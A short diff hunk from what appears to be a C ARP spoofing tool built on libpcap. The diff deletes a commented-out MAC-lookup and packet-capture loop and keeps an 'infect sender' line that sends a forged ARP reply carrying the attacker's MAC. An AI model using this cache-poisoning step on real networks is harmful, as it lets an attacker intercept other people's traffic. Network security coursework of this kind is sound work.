@@ -163,31 +163,6 @@ int main(int argc, char* argv[]) {
 				break;
 			}
 		}
-
-		/*
-		// find target mac(router)
-		send_arp(handle, "ff:ff:ff:ff:ff:ff", attacker_mac, attacker_mac, attacker_ip, "00:00:00:00:00:00", argv[i + 1]);
-
-		// capture packet
-		char target_mac[18];
-		while(true) {
-			struct pcap_pkthdr* header;
-			const u_char* packet;
-			int res = pcap_next_ex(handle, &header, &packet);
-			if(res == 0) continue;
-			if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-				printf("pcap_next_ex error\n");
-				break;
-			}
-			printf("%u bytes caputured\n", header->caplen);
-			bool finish = handle_packet(packet, header, temp);
-			if(finish) {
-				snprintf(target_mac, sizeof(target_mac),  "%02x:%02x:%02x:%02x:%02x:%02x", temp[0], temp[1], temp[2], temp[3], temp[4], temp[5]);
-				break;
-			}
-		}
-		
-		*/
 		// infect sender
 		send_arp(handle, sender_mac, attacker_mac, attacker_mac, argv[i + 1], "00:00:00:00:00:00", argv[i]);
 
